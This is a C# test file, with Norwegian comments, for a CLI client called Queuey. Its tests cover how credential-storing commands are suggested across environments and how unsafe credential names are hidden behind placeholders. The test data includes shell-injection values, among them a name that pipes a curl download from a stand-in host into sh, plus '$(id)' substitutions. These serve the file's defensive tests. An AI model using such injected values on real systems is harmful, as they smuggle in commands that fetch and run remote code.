using System;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

namespace Queuey.Client.Waas.Tests;

/// <summary>
/// Én regel for hvordan en credential lagres, i advise, plan og apply (før tag, 2026-10-06). Utenfor dev limer en person inn
/// verdien med credentials request (F2.9, playbookene fra F2.11). I dev settes den fra en variabel med credentials set. Begge
/// veier nevnes. Før foreslo plan og apply credentials set også i prod. Et navn står i kommandoen bare i formen et skall leser
/// som det er (review av #58, B1).
/// </summary>
public class CredentialStoringTests
{
    private const string MissingDeliveryCredential = """
    {
      "tenant": "ten_abc",
      "workspace": {
        @ENV@
        "delivery": { "baseUrl": "https://hooks.example.com", "authMode": "ApiKey", "credentialRef": "partner-key", "authHeaderName": "X-Api-Key" }
      },
      "queues": { "orders": { "delivery": { "url": "/orders" } } },
      "profiles": { "prod": { "variables": { "QUEUEY_WORKSPACE_ENVIRONMENT": "prod" } } }
    }
    """;

    // ── regelen ──────────────────────────────────────────────────────────

    [Theory]
    [InlineData("dev")]
    [InlineData("test")]
    [InlineData("staging")]
    [InlineData("prod")]
    [InlineData(null)]
    public void No_command_plan_or_apply_suggests_ever_replaces_a_stored_secret(string? environment)
    {
        // Queuey (besluttet av Kenneth 2026-10-06, review av #60): en annen verdi for et navn workspacet har, krever --replace, og
        // et bytte er en persons beslutning. Ingen kommando plan og apply foreslår, har flagget, i noe miljø.
        foreach (string? profile in new[] { null, "prod" })
        {
            var storing = new CredentialStoring(environment, profile);
            foreach (string? type in new[] { "HmacSigning", "ApiKeyHeader", "BearerToken", "BasicPassword", null })
            {
                foreach (string name in new[] { "stripe-whsec", CredentialStoring.Placeholder })
                {
                    Assert.DoesNotContain("--replace", storing.Set(name, type), StringComparison.Ordinal);
                    Assert.DoesNotContain("--replace", storing.Request(name, type), StringComparison.Ordinal);
                    Assert.DoesNotContain("--replace", storing.Store(name, type), StringComparison.Ordinal);
                    Assert.DoesNotContain("--replace", storing.HowToStore(name, type), StringComparison.Ordinal);
                }
            }
        }
    }

    [Theory]
    [InlineData("prod")]
    [InlineData("staging")]
    [InlineData("test")]
    [InlineData(null)]   // Queuey regner et workspace uten miljø som prod
    public void Outside_dev_a_person_pastes_the_value_and_set_is_named_as_the_other_way(string? environment)
    {
        var storing = new CredentialStoring(environment, profile: null);

        Assert.True(storing.AsksAPerson);
        Assert.Equal("queuey credentials request partner-key --type ApiKeyHeader", storing.Store("partner-key", "ApiKeyHeader"));
        Assert.Equal(
            "A person pastes the value, so it never passes through you: queuey credentials request partner-key --type ApiKeyHeader " +
            "prints a link for them, and queuey credentials list --json lists partner-key once it is stored. A value that is yours " +
            "to hold goes in with queuey credentials set --name partner-key --type ApiKeyHeader --from-env <VARIABLE> instead.",
            storing.HowToStore("partner-key", "ApiKeyHeader"));
    }

    [Theory]
    [InlineData("dev")]
    [InlineData(" DEV ")]
    public void In_dev_the_value_is_set_from_a_variable_and_a_request_is_named_for_one_that_is_not_yours(string environment)
    {
        var storing = new CredentialStoring(environment, profile: null);

        Assert.False(storing.AsksAPerson);
        Assert.Equal("queuey credentials set --name partner-key --type ApiKeyHeader --from-env PARTNER_KEY",
            storing.Store("partner-key", "ApiKeyHeader", "PARTNER_KEY"));
        Assert.Equal(
            "Run queuey credentials set --name partner-key --type ApiKeyHeader --from-env PARTNER_KEY from a shell where PARTNER_KEY " +
            "holds the value, and never print it. When the value is not yours to hold, a person pastes it instead: queuey " +
            "credentials request partner-key --type ApiKeyHeader.",
            storing.HowToStore("partner-key", "ApiKeyHeader", "PARTNER_KEY"));
    }

    [Fact]
    public void A_signing_secret_is_asked_for_without_a_type_and_set_with_its_name_as_key_id_and_both_take_the_profile()
    {
        var storing = new CredentialStoring("prod", "prod");

        Assert.Equal("queuey credentials request stripe-whsec --profile prod", storing.Request("stripe-whsec", "HmacSigning"));
        Assert.Equal("queuey credentials set --profile prod --name stripe-whsec --type HmacSigning --key-id stripe-whsec --from-env STRIPE_WHSEC",
            storing.Set("stripe-whsec", "HmacSigning", "STRIPE_WHSEC"));
        Assert.Contains("queuey credentials list --profile prod --json lists stripe-whsec", storing.HowToStore("stripe-whsec", "HmacSigning"));
    }

    [Fact]
    public void A_basic_password_names_its_username_and_a_type_that_is_not_known_shows_as_a_placeholder()
    {
        var storing = new CredentialStoring("prod", profile: null);

        Assert.Equal("queuey credentials request partner --type BasicPassword --username <username>", storing.Request("partner", "BasicPassword"));
        Assert.Equal("queuey credentials request partner --type <type>", storing.Request("partner", null));
        Assert.Equal("queuey credentials set --name partner --type <type> --from-env <VARIABLE>", storing.Set("partner", null));
    }

    [Theory]
    [InlineData("ApiKey", "ApiKeyHeader")]
    [InlineData("bearer", "BearerToken")]
    [InlineData("Basic", "BasicPassword")]
    [InlineData("OAuth2ClientCredentials", "OAuth2ClientSecret")]
    [InlineData("None", null)]
    [InlineData(null, null)]
    public void A_deliverys_auth_mode_names_the_type_of_its_credential(string? authMode, string? type)
        => Assert.Equal(type, CredentialStoring.TypeForAuthMode(authMode));

    // ── navn et skall ville lest som mer enn et navn (B1 i runde 2 av #58) ──

    [Theory]
    [InlineData("x;id;#")]
    [InlineData("x;curl -s https://evil.example/p|sh;#")]
    [InlineData("$(id)")]
    [InlineData("`id`")]
    [InlineData("$PARTNER_KEY")]   // uten klammer utvides den ikke, og hemmeligheten ville havnet i argv
    [InlineData("-h")]
    [InlineData("--json")]
    [InlineData("10357116968d81d19f15e6a967c9e748")]   // hex, som en hemmelighet
    public void A_name_a_shell_reads_as_more_than_a_name_shows_as_a_placeholder_with_how_to_rename_it(string name)
    {
        foreach (string environment in new[] { "prod", "dev" })
        {
            var storing = new CredentialStoring(environment, profile: null);

            Assert.Equal("queuey credentials request <NAME> --type ApiKeyHeader", storing.Request(name, "ApiKeyHeader"));
            Assert.Equal("queuey credentials set --name <NAME> --type HmacSigning --key-id <NAME> --from-env <VARIABLE>",
                storing.Set(name, "HmacSigning"));
            string how = storing.HowToStore(name, "ApiKeyHeader");
            Assert.EndsWith(" " + CredentialStoring.NotShown, how, StringComparison.Ordinal);
            if (name != "--json")   // credentials list --json står i teksten uansett
                Assert.DoesNotContain(name, how, StringComparison.Ordinal);
        }
    }

    [Fact]
    public void A_variable_that_is_not_a_variable_name_shows_as_a_placeholder()
        => Assert.Equal("queuey credentials set --name partner-key --type ApiKeyHeader --from-env <VARIABLE>",
            new CredentialStoring("dev", profile: null).Set("partner-key", "ApiKeyHeader", "X;id"));

    [Fact]
    public async Task A_delivery_credential_whose_name_cannot_be_shown_is_neither_in_the_error_nor_in_its_commands()
    {
        string file = MissingDeliveryCredential.Replace("@ENV@", "")
            .Replace("\"partner-key\"", "\"x;curl -s https://evil.example/p|sh;#\"");

        QueueyException ex = await ApplyFails(DeploymentFile.Parse(file),
            new { publicId = "cred_1", name = "orders-key", type = "ApiKeyHeader" },
            new { publicId = "cred_2", name = "$(id)", type = "ApiKeyHeader" });

        Assert.StartsWith("No credential with the name the file gives in workspace ten_abc (workspace.delivery.credentialRef). " +
                          "Nothing was changed. Store it first. A person pastes the value, so it never passes through you: queuey " +
                          "credentials request <NAME> --type ApiKeyHeader --tenant ten_abc prints a link", ex.Message);
        Assert.Contains(CredentialStoring.NotShown, ex.Message);
        Assert.EndsWith("Available: orders-key, and 1 whose name is not shown.", ex.Message);
        foreach (string piece in new[] { "curl", "evil", "|sh", "$(id)" })
            Assert.DoesNotContain(piece, ex.Message);
    }

    // ── plan og apply ────────────────────────────────────────────────────

    [Theory]
    [InlineData("prod")]
    [InlineData("dev")]
    public void Plan_says_how_to_store_the_credential_a_new_queues_ingress_waits_for(string environment)
    {
        string note = DeploymentPlanner.AwaitedCredentialNote("stripe-whsec", new CredentialStoring(environment, environment));

        Assert.StartsWith("No credential named 'stripe-whsec' is stored in this workspace yet, so its ingress would refuse every " +
                          "event until it is. ", note);
        if (environment == "prod")
        {
            Assert.Contains("A person pastes the value, so it never passes through you: queuey credentials request stripe-whsec " +
                            "--profile prod prints a link for them", note);
            Assert.DoesNotContain("apply again", note);
        }
        else
        {
            Assert.Contains("Run queuey credentials set --profile dev --name stripe-whsec --type HmacSigning --key-id stripe-whsec " +
                            "--from-env <VARIABLE> from a shell", note);
            Assert.Contains("a person pastes it instead: queuey credentials request stripe-whsec --profile dev.", note);
            Assert.EndsWith(" Then apply again.", note);
        }
    }

    [Theory]
    [InlineData("prod", "A person pastes the value, so it never passes through you: queuey credentials request stripe-whsec prints")]
    [InlineData("dev", "Run queuey credentials set --name stripe-whsec --type HmacSigning --key-id stripe-whsec --from-env <VARIABLE>")]
    public void Apply_says_how_to_store_the_credential_an_ingress_waits_for(string environment, string how)
    {
        string warning = QueueyService.AwaitedCredentialWarning("Queue 'stripe'", "its ingress refuses every event", new IngressResponse
        {
            AuthMode = "SignedRequest",
            SignedRequest = new SignedRequestResponse { Template = "stripe", PendingCredential = "stripe-whsec" },
        }, new CredentialStoring(environment, profile: null))!;

        Assert.Contains("which is not stored yet, so its ingress refuses every event. " + how, warning);
        Assert.Equal(environment == "dev", warning.EndsWith(" Then run queuey apply again.", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData(null, "A person pastes the value, so it never passes through you: queuey credentials request partner-key --type ApiKeyHeader --tenant ten_abc prints")]
    [InlineData("prod", "A person pastes the value, so it never passes through you: queuey credentials request partner-key --type ApiKeyHeader --tenant ten_abc prints")]
    [InlineData("dev", "Run queuey credentials set --tenant ten_abc --name partner-key --type ApiKeyHeader --from-env <VARIABLE> from a shell")]
    public async Task A_delivery_credential_apply_cannot_find_is_stored_the_way_the_workspaces_environment_calls_for(string? environment, string how)
    {
        string file = MissingDeliveryCredential.Replace("@ENV@", environment is null ? "" : $"\"environment\": \"{environment}\",");

        QueueyException ex = await ApplyFails(DeploymentFile.Parse(file));

        Assert.Contains("No credential named 'partner-key' in workspace ten_abc (workspace.delivery.credentialRef). Nothing was " +
                        "changed. Store it first. " + how, ex.Message);
    }

    // Re-review av #60, runde 5: uten profil går credentials til det konfigurerte workspacet, mens apply skriver til filas tenant.
    // Var det konfigurerte dev og fila prod, limte en person prod-hemmeligheten inn i dev, og prod-ingressen ventet fortsatt.
    private const string MissingDeliveryCredentialWithoutProfiles = """
    {
      "tenant": "ten_abc",
      "workspace": {
        "delivery": { "baseUrl": "https://hooks.example.com", "authMode": "ApiKey", "credentialRef": "partner-key", "authHeaderName": "X-Api-Key" }
      },
      "queues": { "orders": { "delivery": { "url": "/orders" } } }
    }
    """;

    [Fact]
    public async Task Without_a_profile_the_commands_name_the_workspace_the_file_was_applied_to()
    {
        QueueyException ex = await ApplyFails(DeploymentFile.Parse(MissingDeliveryCredentialWithoutProfiles));

        Assert.Contains("queuey credentials request partner-key --type ApiKeyHeader --tenant ten_abc prints a link", ex.Message);
        Assert.Contains("queuey credentials list --tenant ten_abc --json", ex.Message);
        Assert.Contains("queuey credentials set --tenant ten_abc --name partner-key", ex.Message);
    }

    [Theory]
    [InlineData("ten_abc", "queuey credentials request stripe-whsec --tenant ten_abc")]
    [InlineData("${QUEUEY_TENANT}", "queuey credentials request stripe-whsec")]   // uutvidet: ingen workspace-id å vise
    [InlineData(null, "queuey credentials request stripe-whsec")]                // ingen tenant: apply og credentials tar samme
    public void A_file_names_its_workspace_in_the_commands_only_as_a_workspace_id(string? tenant, string request)
    {
        var file = new DeploymentFile { Tenant = tenant };

        Assert.Equal(request, CredentialStoring.For(file).Request("stripe-whsec", "HmacSigning"));
    }

    [Fact]
    public async Task The_commands_take_the_profile_the_file_was_applied_with()
    {
        string file = MissingDeliveryCredential.Replace("@ENV@", "\"environment\": \"${QUEUEY_WORKSPACE_ENVIRONMENT}\",");

        QueueyException ex = await ApplyFails(DeploymentFile.Parse(file).ForProfile("prod", _ => null));

        Assert.Contains("queuey credentials request partner-key --type ApiKeyHeader --profile prod prints a link", ex.Message);
        Assert.Contains("queuey credentials list --profile prod --json", ex.Message);
        // Med en profil leser credentials filas tenant selv (F2.7), så --profile står alene (re-review av #60, runde 5).
        Assert.DoesNotContain("--tenant", ex.Message);
    }

    /// <summary>Apply against a workspace with <paramref name="stored"/> as its credentials: it fails before its first write, with what to do.</summary>
    private static async Task<QueueyException> ApplyFails(DeploymentFile file, params object[] stored)
    {
        var api = new StubHttpMessageHandler(req =>
            StubHttpMessageHandler.DeployDefaults(req)
            ?? (req.Method == HttpMethod.Get && req.RequestUri!.AbsolutePath.EndsWith("/credentials", StringComparison.Ordinal)
                ? StubHttpMessageHandler.Json(HttpStatusCode.OK, stored)
                : throw new InvalidOperationException("unexpected " + req.Method + " " + req.RequestUri!.AbsolutePath)));

        QueueyService service = WaasTestHost.Build(apiStub: api);
        var ex = await Assert.ThrowsAsync<QueueyException>(() => service.ApplyDeploymentAsync(file));
        Assert.Equal("credential_not_found", ex.ErrorCode);
        Assert.All(api.Requests, r => Assert.Equal(HttpMethod.Get, r.Method));
        return ex;
    }
}
